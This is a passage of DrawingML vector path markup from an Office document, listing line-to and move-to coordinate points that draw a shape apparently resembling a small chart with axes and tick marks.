                  <a:lnTo>
                    <a:pt x="2972" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="9135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="8695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="8108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="6824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="5577"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="4880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="4183"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2385" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2238" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="515"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="1432"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="1542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="1762"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="1762"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="1652"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="4293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="5577"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="5687"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="5797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="5907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="5907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="7411"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="7521"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="7521"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="9135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="9245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="10419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="10419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="10529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="10749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="10859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="12143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="12033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="12143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="12840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="12840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="12033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="12033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="12143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="12803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="12840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="12803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13280" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13243" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13243" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13353" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13610" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14637" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14893" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14857" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14857" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16618" y="11776"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16654" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16361" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16287" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16251" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16287" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16471" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16581" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16728" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16801" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16984" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="11336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17425" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17058" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16728" y="10639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16654" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16581" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="10639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16471" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="10859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16471" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16801" y="11226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="11336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="11079"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="11226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="11446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="11336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="11226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13169" y="11079"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="10419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13976" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="10382"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13390" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="10749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="11446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="10639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="9832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13976" y="9612"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="9245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13463" y="9612"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13243" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="10419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="10052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="9832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="9025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="8548"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="8915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="9025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="8915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15517" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15737" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15994" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16361" y="8915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="8915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17204" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17608" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17681" y="8695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17755" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17791" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17755" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17718" y="8328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17681" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17571" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="8254"/>
                  </a:lnTo>
